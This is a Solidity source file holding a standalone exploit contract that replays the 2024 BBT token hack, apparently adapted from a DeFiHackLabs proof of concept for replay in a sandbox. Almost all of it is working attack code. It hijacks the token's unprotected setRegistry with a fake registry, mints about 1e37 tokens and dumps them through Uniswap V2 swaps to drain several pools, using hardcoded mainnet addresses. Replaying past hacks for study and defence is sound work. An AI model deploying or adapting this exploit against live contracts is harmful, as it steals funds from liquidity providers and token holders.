// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-BBT).
// The DeFiHackLabs PoC runs the attack via nested CREATE2 deploys: ContractTest.attack()
// CREATE2-deploys `Money`, whose CONSTRUCTOR does the entire attack inline (setRegistry
// -> mint -> two router swaps), which itself CREATE2-deploys `Moneys` (a fake registry
// that just echoes back its caller). attacker == address(this) (the test contract) in
// the original PoC. This contract is a faithful, self-contained copy of that inline
// attack collapsed into a single deployable exploit with an explicit entrypoint, so the
// playground can deploy it once and record one function call. Logic and constants are
// copied verbatim from test/BBT_exp.sol.
//
// Root cause: BBToken.setRegistry(address) has NO access control — anyone can repoint
// the token's trust anchor (slot 0) to a contract they control. BBToken.mint() then
// asks that (now attacker-owned) registry "is my caller authorized?", which always
// returns true once the registry is hijacked, and mint() has no supply cap. The
// attacker mints 1e37 BBT out of thin air and dumps it through two Uniswap V2 routes.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface BBtoken is IERC20 {
    function setRegistry(address _registry) external;
    function mint(address _user, uint256 _amount) external;
}

interface Uni_Router_V2 {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract BBTDrain {
    BBtoken constant BBT = BBtoken(0x3541499cda8CA51B24724Bb8e7Ce569727406E04);
    Uni_Router_V2 constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BLM = IERC20(0xEa0abF7AB2F8f8435e7Dc4932FFaB37761267843);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address public fakeRegistry;

    // step 0: entrypoint — mirrors ContractTest.attack() -> Money's constructor body.
    function attack() external {
        // step 1: CREATE2-deploy a fake registry that echoes back its caller as the
        // authorized module for any role name.
        fakeRegistry = address(new Moneys());

        // step 2: hijack the trust anchor — setRegistry has NO access control.
        BBT.setRegistry(fakeRegistry);

        // step 3: mint 1e37 BBT (1e19 whole token-units) out of thin air. mint()
        // asks fakeRegistry.getContractAddress(role) which always returns
        // msg.sender (this contract), so _isAuthorized() is always true.
        BBT.mint(address(this), 10_000_000_000_000_000_000 ether);

        // step 4: approve the router to spend the freshly minted BBT.
        BBT.approve(address(Router), type(uint256).max);

        // step 5: Swap 1 — dump 1e30 BBT directly into the BBT/WETH pool. The
        // pool holds only ~6.08e21 BBT / 1.9493 WETH, so this saturates the
        // output and drains essentially the whole WETH side.
        address[] memory path = new address[](2);
        path[0] = address(BBT);
        path[1] = address(WETH);
        Router.swapExactTokensForETH(
            1_000_000_000_000_000_000_000_000_000_000, 0, path, address(this), block.timestamp
        );

        // step 6: Swap 2 — dump another 1e30 BBT through the multi-hop
        // BBT -> BLM -> USDC -> WETH route, draining those three pools too.
        address[] memory paths = new address[](4);
        paths[0] = address(BBT);
        paths[1] = address(BLM);
        paths[2] = address(USDC);
        paths[3] = address(WETH);
        Router.swapExactTokensForETH(
            1_000_000_000_000_000_000_000_000_000_000, 0, paths, address(this), block.timestamp
        );
    }

    // Collects the unwrapped ETH the router sends back on each swap.
    receive() external payable {}
}

// Faithful copy of the attacker's fake registry (test/BBT_exp.sol `Moneys`).
// getContractAddress always returns `owner` (the deployer, i.e. BBTDrain), so
// BBToken's mint-authorization check passes for any of the five role names.
contract Moneys {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function getContractAddress(string memory) public view returns (address) {
        return owner;
    }

    fallback() external payable {}
}
